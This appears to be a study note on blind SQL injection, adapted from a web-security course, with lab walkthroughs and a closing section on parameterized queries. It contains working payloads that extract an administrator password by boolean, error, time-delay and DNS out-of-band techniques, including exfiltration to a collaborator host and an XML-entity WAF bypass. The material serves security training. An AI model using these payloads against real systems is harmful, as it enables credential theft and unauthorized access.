---
layout: default
title: "Blind SQLI"
---
En esta sección, describimos técnicas para encontrar y explotar vulnerabilidades de inyección SQL ciega.

## ¿Qué es la inyección SQL ciega?

La inyección ciega de SQL ocurre cuando una aplicación es vulnerable a la inyección de SQL, pero sus respuestas HTTP no contienen los resultados de la consulta SQL relevante ni los detalles de ningún error de la base de datos.

Muchas técnicas, como `UNION`los ataques, no son efectivas con las vulnerabilidades de inyección SQL ciega. Esto se debe a que dependen de poder ver los resultados de la consulta inyectada dentro de las respuestas de la aplicación. Todavía es posible explotar la inyección SQL ciega para acceder a datos no autorizados, pero se deben utilizar técnicas diferentes.

## Explotar la inyección SQL ciega activando respuestas condicionales

Considere una aplicación que utiliza cookies de seguimiento para recopilar análisis sobre el uso. Las solicitudes a la aplicación incluyen un encabezado de cookie como este:

`Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4`

`TrackingId`Cuando se procesa una solicitud que contiene una cookie, la aplicación utiliza una consulta SQL para determinar si se trata de un usuario conocido:

`SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'`

Esta consulta es vulnerable a la inyección SQL, pero los resultados de la consulta no se devuelven al usuario. Sin embargo, la aplicación se comporta de manera diferente dependiendo de si la consulta devuelve algún dato. Si envía un mensaje reconocido `TrackingId`, la consulta devuelve datos y recibe un mensaje de "Bienvenido" en la respuesta.

Este comportamiento es suficiente para poder explotar la vulnerabilidad de inyección SQL ciega. Puede recuperar información activando diferentes respuestas de forma condicional, dependiendo de la condición inyectada.

Para comprender cómo funciona este exploit, supongamos que se envían dos solicitudes que contienen `TrackingId`a su vez los siguientes valores de cookies:

`…xyz' AND '1'='1 …xyz' AND '1'='2`

- El primero de estos valores hace que la consulta devuelva resultados, porque la `AND '1'='1`condición inyectada es verdadera. Como resultado, se muestra el mensaje "Bienvenido de nuevo".
- El segundo valor hace que la consulta no devuelva ningún resultado porque la condición inyectada es falsa. El mensaje "Bienvenido de nuevo" no se muestra.

Esto nos permite determinar la respuesta a cualquier condición inyectada y extraer datos pieza por pieza.

Por ejemplo, supongamos que hay una tabla llamada `Users`con las columnas `Username`y `Password`y un usuario llamado `Administrator`. Puede determinar la contraseña de este usuario enviando una serie de entradas para probar la contraseña, un carácter a la vez.

Para hacer esto, comience con la siguiente entrada:

`xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm`

Esto devuelve el mensaje "Bienvenido nuevamente", lo que indica que la condición inyectada es verdadera y, por lo tanto, el primer carácter de la contraseña es mayor que `m`.

A continuación, enviamos la siguiente entrada:

`xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 't`

Esto no devuelve el mensaje "Bienvenido", lo que indica que la condición inyectada es falsa y, por lo tanto, el primer carácter de la contraseña no es mayor que `t`.

Finalmente, enviamos la siguiente entrada, que devuelve el mensaje "Bienvenido", confirmando así que el primer carácter de la contraseña es `s`:

`xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's`

Podemos continuar este proceso para determinar sistemáticamente la contraseña completa del `Administrator`usuario.
#### Nota
La `SUBSTRING`función se llama `SUBSTR`en algunos tipos de bases de datos. Para obtener más detalles, consulte la hoja de referencia de inyección SQL.

![[Pasted image 20240506194652.png]]
![[Pasted image 20240506194723.png]]
![[Pasted image 20240506194737.png]]![[Pasted image 20240506194746.png]]
https://www.youtube.com/watch?v=kpdDTkRzYbw

## Error-based SQL injection

La inyección SQL basada en errores se refiere a casos en los que puede utilizar mensajes de error para extraer o inferir datos confidenciales de la base de datos, incluso en contextos ciegos. Las posibilidades dependen de la configuración de la base de datos y de los tipos de errores que puedas provocar:

- Es posible que pueda inducir a la aplicación a devolver una respuesta de error específica basada en el resultado de una expresión booleana. Puedes explotar esto de la misma manera que las respuestas condicionales que vimos en la sección anterior. Para obtener más información, consulte Explotación de la inyección SQL ciega provocando errores condicionales.
- Es posible que pueda activar mensajes de error que generen los datos devueltos por la consulta. Esto efectivamente convierte las vulnerabilidades de inyección SQL que de otro modo serían ciegas en vulnerabilidades visibles. Para obtener más información, consulte Extracción de datos confidenciales mediante mensajes de error SQL detallados.

## Explotar la inyección SQL ciega provocando errores condicionales

Algunas aplicaciones realizan consultas SQL pero su comportamiento no cambia, independientemente de si la consulta devuelve algún dato. La técnica de la sección anterior no funcionará porque inyectar diferentes condiciones booleanas no afecta las respuestas de la aplicación.

A menudo es posible inducir a la aplicación a devolver una respuesta diferente dependiendo de si se produce un error de SQL. Puede modificar la consulta para que provoque un error en la base de datos solo si la condición es verdadera. Muy a menudo, un error no controlado generado por la base de datos provoca alguna diferencia en la respuesta de la aplicación, como un mensaje de error. Esto le permite inferir la verdad de la condición inyectada.

Para ver cómo funciona esto, supongamos que se envían dos solicitudes que contienen `TrackingId`a su vez los siguientes valores de cookies:

`xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a`

Estas entradas utilizan la `CASE`palabra clave para probar una condición y devolver una expresión diferente dependiendo de si la expresión es verdadera:

- Con la primera entrada, la `CASE`expresión se evalúa como `'a'`, lo que no provoca ningún error.
- Con la segunda entrada, se evalúa como `1/0`, lo que provoca un error de división por cero.

Si el error causa una diferencia en la respuesta HTTP de la aplicación, puede usarlo para determinar si la condición inyectada es verdadera.

Con esta técnica, puedes recuperar datos probando un carácter a la vez:

`xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a`

#### Nota

Existen diferentes formas de desencadenar errores condicionales y diferentes técnicas funcionan mejor en diferentes tipos de bases de datos. Para obtener más detalles, consulte la hoja de referencia de inyección SQL.

## Extracción de datos confidenciales mediante mensajes de error SQL detallados

La mala configuración de la base de datos a veces genera mensajes de error detallados. Estos pueden proporcionar información que puede resultar útil para un atacante. Por ejemplo, considere el siguiente mensaje de error, que aparece después de insertar una comilla simple en un `id`parámetro:

`Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = '''. Expected char`

Esto muestra la consulta completa que la aplicación construyó utilizando nuestra entrada. Podemos ver que en este caso, estamos inyectando una cadena entre comillas simples dentro de una `WHERE`declaración. Esto facilita la creación de una consulta válida que contenga una carga útil maliciosa. Comentar el resto de la consulta evitaría que las comillas simples superfluas rompan la sintaxis.

En ocasiones, es posible que pueda inducir a la aplicación a generar un mensaje de error que contenga algunos de los datos devueltos por la consulta. Esto efectivamente convierte una vulnerabilidad de inyección SQL que de otro modo sería ciega en una vulnerabilidad visible.

Puede utilizar la `CAST()`función para lograr esto. Le permite convertir un tipo de datos a otro. Por ejemplo, imagine una consulta que contenga la siguiente declaración:

`CAST((SELECT example_column FROM example_table) AS int)`

A menudo, los datos que intentas leer son una cadena. Intentar convertir esto a un tipo de datos incompatible, como `int`, puede provocar un error similar al siguiente:

`ERROR: invalid input syntax for type integer: "Example data"`

Este tipo de consulta también puede resultar útil si un límite de caracteres le impide activar respuestas condicionales.

----
1. Using Burp's built-in browser, explore the lab functionality.
2. Go to the **Proxy > HTTP history** tab and find a `GET /` request that contains a `TrackingId` cookie.
3. In Repeater, append a single quote to the value of your `TrackingId` cookie and send the request.
    
    `TrackingId=ogAZZfxtOKUELbuJ'`
4. In the response, notice the verbose error message. This discloses the full SQL query, including the value of your cookie. It also explains that you have an unclosed string literal. Observe that your injection appears inside a single-quoted string.
5. In the request, add comment characters to comment out the rest of the query, including the extra single-quote character that's causing the error:
    
    `TrackingId=ogAZZfxtOKUELbuJ'--`
6. Send the request. Confirm that you no longer receive an error. This suggests that the query is now syntactically valid.
7. Adapt the query to include a generic `SELECT` subquery and cast the returned value to an `int` data type:
    
    `TrackingId=ogAZZfxtOKUELbuJ' AND CAST((SELECT 1) AS int)--`
8. Send the request. Observe that you now get a different error saying that an `AND` condition must be a boolean expression.
9. Modify the condition accordingly. For example, you can simply add a comparison operator (`=`) as follows:
    
    `TrackingId=ogAZZfxtOKUELbuJ' AND 1=CAST((SELECT 1) AS int)--`
10. Send the request. Confirm that you no longer receive an error. This suggests that this is a valid query again.
11. Adapt your generic `SELECT` statement so that it retrieves usernames from the database:
    
    `TrackingId=ogAZZfxtOKUELbuJ' AND 1=CAST((SELECT username FROM users) AS int)--`
12. Observe that you receive the initial error message again. Notice that your query now appears to be truncated due to a character limit. As a result, the comment characters you added to fix up the query aren't included.
13. Delete the original value of the `TrackingId` cookie to free up some additional characters. Resend the request.
    
    `TrackingId=' AND 1=CAST((SELECT username FROM users) AS int)--`
14. Notice that you receive a new error message, which appears to be generated by the database. This suggests that the query was run properly, but you're still getting an error because it unexpectedly returned more than one row.
15. Modify the query to return only one row:
    
    `TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--`
16. Send the request. Observe that the error message now leaks the first username from the `users` table:
    
    `ERROR: invalid input syntax for type integer: "administrator"`
17. Now that you know that the `administrator` is the first user in the table, modify the query once again to leak their password:
    
    `TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--`
18. Log in as `administrator` using the stolen password to solve the lab.

## Explotación de la inyección SQL ciega provocando retrasos de tiempo

Si la aplicación detecta errores de la base de datos cuando se ejecuta la consulta SQL y los maneja correctamente, no habrá ninguna diferencia en la respuesta de la aplicación. Esto significa que la técnica anterior para inducir errores condicionales no funcionará.

En esta situación, a menudo es posible explotar la vulnerabilidad de la inyección SQL ciega activando retrasos de tiempo dependiendo de si una condición inyectada es verdadera o falsa. Como las consultas SQL normalmente las procesa la aplicación de forma sincrónica, retrasar la ejecución de una consulta SQL también retrasa la respuesta HTTP. Esto le permite determinar la verdad de la condición inyectada en función del tiempo necesario para recibir la respuesta HTTP.

Las técnicas para activar un retraso de tiempo son específicas del tipo de base de datos que se utiliza. Por ejemplo, en Microsoft SQL Server, puede utilizar lo siguiente para probar una condición y desencadenar un retraso dependiendo de si la expresión es verdadera:

`'; IF (1=2) WAITFOR DELAY '0:0:10'-- '; IF (1=1) WAITFOR DELAY '0:0:10'--`

- La primera de estas entradas no desencadena un retraso porque la condición `1=2`es falsa.
- La segunda entrada desencadena un retraso de 10 segundos, porque la condición `1=1`es verdadera.

Usando esta técnica, podemos recuperar datos probando un carácter a la vez:

`'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--`

#### Nota

Hay varias formas de desencadenar retrasos en las consultas SQL y se aplican diferentes técnicas en diferentes tipos de bases de datos. Para obtener más detalles, consulte la hoja de referencia de inyección SQL.

-----
1. Visit the front page of the shop, and use Burp Suite to intercept and modify the request containing the `TrackingId` cookie.
2. Modify the `TrackingId` cookie, changing it to:
    
    `TrackingId=x'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--`
    
    Verify that the application takes 10 seconds to respond.
    
3. Now change it to:
    
    `TrackingId=x'%3BSELECT+CASE+WHEN+(1=2)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--`
    
    Verify that the application responds immediately with no time delay. This demonstrates how you can test a single boolean condition and infer the result.
    
4. Now change it to:
    
    `TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--`
    
    Verify that the condition is true, confirming that there is a user called `administrator`.
    
5. The next step is to determine how many characters are in the password of the `administrator` user. To do this, change the value to:
    
    `TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--`
    
    This condition should be true, confirming that the password is greater than 1 character in length.
    
6. Send a series of follow-up values to test different password lengths. Send:
    
    `TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>2)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--`
    
    Then send:
    
    `TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>3)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--`
    
    And so on. You can do this manually using Burp Repeater, since the length is likely to be short. When the condition stops being true (i.e. when the application responds immediately without a time delay), you have determined the length of the password, which is in fact 20 characters long.
    
7. After determining the length of the password, the next step is to test the character at each position to determine its value. This involves a much larger number of requests, so you need to use Burp Intruder. Send the request you are working on to Burp Intruder, using the context menu.
8. In the Positions tab of Burp Intruder, change the value of the cookie to:
    
    `TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='a')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--`
    
    This uses the `SUBSTRING()` function to extract a single character from the password, and test it against a specific value. Our attack will cycle through each position and possible value, testing each one in turn.
    
9. Place payload position markers around the `a` character in the cookie value. To do this, select just the `a`, and click the "Add §" button. You should then see the following as the cookie value (note the payload position markers):
    
    `TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='§a§')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--`
10. To test the character at each position, you'll need to send suitable payloads in the payload position that you've defined. You can assume that the password contains only lower case alphanumeric characters. Go to the Payloads tab, check that "Simple list" is selected, and under "Payload settings" add the payloads in the range a - z and 0 - 9. You can select these easily using the "Add from list" drop-down.
11. To be able to tell when the correct character was submitted, you'll need to monitor the time taken for the application to respond to each request. For this process to be as reliable as possible, you need to configure the Intruder attack to issue requests in a single thread. To do this, go to the "Resource pool" tab and add the attack to a resource pool with the "Maximum concurrent requests" set to `1`.
12. Launch the attack by clicking the "Start attack" button or selecting "Start attack" from the Intruder menu.
13. Burp Intruder monitors the time taken for the application's response to be received, but by default it does not show this information. To see it, go to the "Columns" menu, and check the box for "Response received".
14. Review the attack results to find the value of the character at the first position. You should see a column in the results called "Response received". This will generally contain a small number, representing the number of milliseconds the application took to respond. One of the rows should have a larger number in this column, in the region of 10,000 milliseconds. The payload showing for that row is the value of the character at the first position.
15. Now, you simply need to re-run the attack for each of the other character positions in the password, to determine their value. To do this, go back to the main Burp window, and the Positions tab of Burp Intruder, and change the specified offset from 1 to 2. You should then see the following as the cookie value:
    
    `TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,2,1)='§a§')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--`
16. Launch the modified attack, review the results, and note the character at the second offset.
17. Continue this process testing offset 3, 4, and so on, until you have the whole password.
18. In the browser, click "My account" to open the login page. Use the password to log in as the `administrator` user.

---
## Exploiting blind SQL injection using out-of-band (OAST) techniques

Una aplicación podría realizar la misma consulta SQL que en el ejemplo anterior pero hacerlo de forma asincrónica. La aplicación continúa procesando la solicitud del usuario en el hilo original y utiliza otro hilo para ejecutar una consulta SQL utilizando la cookie de seguimiento. La consulta sigue siendo vulnerable a la inyección SQL, pero ninguna de las técnicas descritas hasta ahora funcionará. La respuesta de la aplicación no depende de que la consulta devuelva ningún dato, de que se produzca un error en la base de datos o del tiempo necesario para ejecutar la consulta.

En esta situación, a menudo es posible explotar la vulnerabilidad de inyección SQL ciega activando interacciones de red fuera de banda con un sistema que usted controla. Estos pueden activarse en función de una condición inyectada para inferir información pieza por pieza. Lo que es más útil es que los datos se pueden extraer directamente dentro de la interacción de la red.

Se pueden utilizar diversos protocolos de red para este fin, pero normalmente el más eficaz es el DNS (servicio de nombres de dominio). Muchas redes de producción permiten la salida libre de consultas DNS porque son esenciales para el funcionamiento normal de los sistemas de producción.

La herramienta más sencilla y fiable para utilizar técnicas fuera de banda es Burp Collaborator. Este es un servidor que proporciona implementaciones personalizadas de varios servicios de red, incluido DNS. Le permite detectar cuándo se producen interacciones de red como resultado del envío de cargas útiles individuales a una aplicación vulnerable. Burp Suite Professional incluye un cliente integrado que está configurado para funcionar con Burp Collaborator desde el primer momento. Para obtener más información, consulte la documentación de Burp Collaborator.

Las técnicas para activar una consulta DNS son específicas del tipo de base de datos que se utiliza. Por ejemplo, la siguiente entrada en Microsoft SQL Server se puede utilizar para realizar una búsqueda de DNS en un dominio específico:

`'; exec master..xp_dirtree '//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/a'--`

Esto hace que la base de datos realice una búsqueda para el siguiente dominio:

`0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net`

Puede utilizar Burp Collaborator para generar un subdominio único y sondear el servidor de Collaborator para confirmar cuándo se producen búsquedas de DNS.

--------
1. Visite la página principal de la tienda y utilice Burp Suite para interceptar y modificar la solicitud que contiene la `TrackingId`cookie.
2. Modifique la `TrackingId`cookie y cámbiela por una carga útil que desencadenará una interacción con el servidor colaborador. Por ejemplo, puede combinar la inyección SQL con técnicas XXE básicas de la siguiente manera:
    
    `TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--`
3. Haga clic derecho y seleccione "Insertar carga útil de Collaborator" para insertar un subdominio de Burp Collaborator donde se indica en la `TrackingId`cookie modificada.

La solución descrita aquí es suficiente simplemente para activar una búsqueda de DNS y así resolver el laboratorio. En una situación del mundo real, usaría Burp Collaborator para verificar que su carga útil realmente haya activado una búsqueda de DNS y potencialmente explotaría este comportamiento para extraer datos confidenciales de la aplicación. Repasaremos esta técnica en el próximo laboratorio.

----
Una vez confirmada una forma de desencadenar interacciones fuera de banda, puede utilizar el canal fuera de banda para extraer datos de la aplicación vulnerable. Por ejemplo:

`'; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='Administrator');exec('master..xp_dirtree "//'+@p+'.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a"')--`

Esta entrada lee la contraseña del `Administrator`usuario, agrega un subdominio de colaborador único y activa una búsqueda de DNS. Esta búsqueda le permite ver la contraseña capturada:

`S3cure.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net`

Las técnicas fuera de banda (OAST) son una forma poderosa de detectar y explotar la inyección SQL ciega, debido a la alta probabilidad de éxito y la capacidad de exfiltrar datos directamente dentro del canal fuera de banda. Por esta razón, las técnicas OAST suelen ser preferibles incluso en situaciones en las que otras técnicas de explotación ciega sí funcionan.

#### Nota

Hay varias formas de desencadenar interacciones fuera de banda y se aplican diferentes técnicas en diferentes tipos de bases de datos. Para obtener más detalles, consulte la hoja de referencia de inyección SQL.

1. Visite la página principal de la tienda y utilice Burp Suite Professional para interceptar y modificar la solicitud que contiene la `TrackingId`cookie.
2. Modifique la `TrackingId`cookie y cámbiela por una carga útil que filtrará la contraseña del administrador en una interacción con el servidor colaborador. Por ejemplo, puede combinar la inyección SQL con técnicas XXE básicas de la siguiente manera:
    
    `TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--`
3. Haga clic derecho y seleccione "Insertar carga útil de Collaborator" para insertar un subdominio de Burp Collaborator donde se indica en la `TrackingId`cookie modificada.
4. Vaya a la pestaña Colaborador y haga clic en "Encuestar ahora". Si no ve ninguna interacción en la lista, espere unos segundos y vuelva a intentarlo, ya que la consulta del lado del servidor se ejecuta de forma asincrónica.
5. Debería ver algunas interacciones DNS y HTTP iniciadas por la aplicación como resultado de su carga útil. La contraseña del `administrator`usuario debe aparecer en el subdominio de la interacción y puedes verla en la pestaña Colaborador. Para las interacciones DNS, el nombre de dominio completo que se buscó se muestra en la pestaña Descripción. Para las interacciones HTTP, el nombre de dominio completo se muestra en el encabezado Host en la pestaña Solicitud de colaborador.
6. En el navegador, haga clic en "Mi cuenta" para abrir la página de inicio de sesión. Utilice la contraseña para iniciar sesión como `administrator`usuario.

-----

## nyección SQL en diferentes contextos.

En las prácticas anteriores, utilizó la cadena de consulta para inyectar su carga útil de SQL malicioso. Sin embargo, puede realizar ataques de inyección SQL utilizando cualquier entrada controlable que la aplicación procese como una consulta SQL. Por ejemplo, algunos sitios web toman entradas en formato JSON o XML y las utilizan para consultar la base de datos.

Estos diferentes formatos pueden brindarle diferentes formas de ofuscar ataques que de otro modo serían bloqueados debido a WAF y otros mecanismos de defensa. Las implementaciones débiles a menudo buscan palabras clave de inyección SQL comunes dentro de la solicitud, por lo que es posible que pueda omitir estos filtros codificando o escapando caracteres en las palabras clave prohibidas. Por ejemplo, la siguiente inyección SQL basada en XML utiliza una secuencia de escape XML para codificar el `S`carácter en `SELECT`:

`<stockCheck> <productId>123</productId> <storeId>999 &#x53;ELECT * FROM information_schema.tables</storeId> </stockCheck>`

Esto se decodificará en el lado del servidor antes de pasarlo al intérprete de SQL.

**Identificar la vulnerabilidad**

1. Observe que la función de verificación de existencias envía el `productId`y `storeId`a la aplicación en formato XML.
    
2. Envíe la `POST /product/stock`solicitud a Burp Repetidor.
    
3. En Burp Repeater, pruebe `storeId`para ver si se evalúa su entrada. Por ejemplo, intente reemplazar el ID con expresiones matemáticas que evalúen otros ID potenciales, por ejemplo:
    
    `<storeId>1+1</storeId>`
4. Observe que su entrada parece ser evaluada por la aplicación, devolviendo el stock para diferentes tiendas.
    
5. Intente determinar la cantidad de columnas devueltas por la consulta original agregando una `UNION SELECT`declaración al ID de la tienda original:
    
    `<storeId>1 UNION SELECT NULL</storeId>`
6. Observe que su solicitud ha sido bloqueada debido a que fue marcada como un ataque potencial.
    

**Omitir el WAF**

1. Mientras inyecta XML, intente ofuscar su carga útil utilizando entidades XML. Una forma de hacerlo es utilizando la extensión Hackvertor. Simplemente resalte su entrada, haga clic derecho y luego seleccione **Extensiones > Hackvertor > Codificar > dec_entities/hex_entities** .
    
2. Vuelva a enviar la solicitud y observe que ahora recibe una respuesta normal de la aplicación. Esto sugiere que ha omitido con éxito el WAF.
    

**Crea un exploit**

1. Continúe donde lo dejó y deduzca que la consulta devuelve una sola columna. Cuando intenta devolver más de una columna, la aplicación devuelve `0 units`, lo que implica un error.
    
2. Como solo puede devolver una columna, debe concatenar los nombres de usuario y contraseñas devueltos, por ejemplo:
    
    `<storeId><@hex_entities>1 UNION SELECT username || '~' || password FROM users<@/hex_entities></storeId>`
3. Envíe esta consulta y observe que ha obtenido exitosamente los nombres de usuario y contraseñas de la base de datos, separados por un `~`carácter.
    
4. Utilice las credenciales de administrador para iniciar sesión y resolver la práctica de laboratorio.

## Second-order SQL injection

La inyección SQL de primer orden ocurre cuando la aplicación procesa la entrada del usuario desde una solicitud HTTP e incorpora la entrada en una consulta SQL de forma insegura.

La inyección SQL de segundo orden ocurre cuando la aplicación toma la entrada del usuario de una solicitud HTTP y la almacena para uso futuro. Esto generalmente se hace colocando la entrada en una base de datos, pero no se produce ninguna vulnerabilidad en el punto donde se almacenan los datos. Posteriormente, al manejar una solicitud HTTP diferente, la aplicación recupera los datos almacenados y los incorpora a una consulta SQL de forma insegura. Por este motivo, la inyección SQL de segundo orden también se conoce como inyección SQL almacenada.

![[Pasted image 20240507124827.png]]

La inyección de SQL de segundo orden ocurre a menudo en situaciones en las que los desarrolladores conocen las vulnerabilidades de la inyección de SQL y, por lo tanto, manejan de forma segura la ubicación inicial de la entrada en la base de datos. Cuando los datos se procesan posteriormente, se consideran seguros, ya que previamente se colocaron de forma segura en la base de datos. En este punto, los datos se manejan de forma insegura porque el desarrollador los considera erróneamente confiables.

## Cómo prevenir la inyección SQL

Puede evitar la mayoría de los casos de inyección SQL utilizando consultas parametrizadas en lugar de concatenación de cadenas dentro de la consulta. Estas consultas parametrizadas también se conocen como "declaraciones preparadas".

El siguiente código es vulnerable a la inyección SQL porque la entrada del usuario se concatena directamente en la consulta:

`String query = "SELECT * FROM products WHERE category = '"+ input + "'"; Statement statement = connection.createStatement(); ResultSet resultSet = statement.executeQuery(query);`

Puede reescribir este código de manera que evite que la entrada del usuario interfiera con la estructura de la consulta:

`PreparedStatement statement = connection.prepareStatement("SELECT * FROM products WHERE category = ?"); statement.setString(1, input); ResultSet resultSet = statement.executeQuery();`

Puede utilizar consultas parametrizadas para cualquier situación en la que aparezcan entradas que no sean de confianza como datos dentro de la consulta, incluida la `WHERE`cláusula y los valores de una declaración `INSERT`o . `UPDATE`No se pueden usar para manejar entradas que no sean de confianza en otras partes de la consulta, como nombres de tablas o columnas, o la `ORDER BY`cláusula. La funcionalidad de la aplicación que coloca datos que no son de confianza en estas partes de la consulta debe adoptar un enfoque diferente, como por ejemplo:

- Incluir valores de entrada permitidos en la lista blanca.
- Usar una lógica diferente para ofrecer el comportamiento requerido.

Para que una consulta parametrizada sea eficaz a la hora de prevenir la inyección de SQL, la cadena que se utiliza en la consulta siempre debe ser una constante codificada. Nunca debe contener datos variables de ningún origen. No caiga en la tentación de decidir caso por caso si un elemento de datos es confiable y continúe usando la concatenación de cadenas dentro de la consulta para los casos que se consideren seguros. Es fácil cometer errores sobre el posible origen de los datos o que cambios en otro código contaminen los datos confiables.


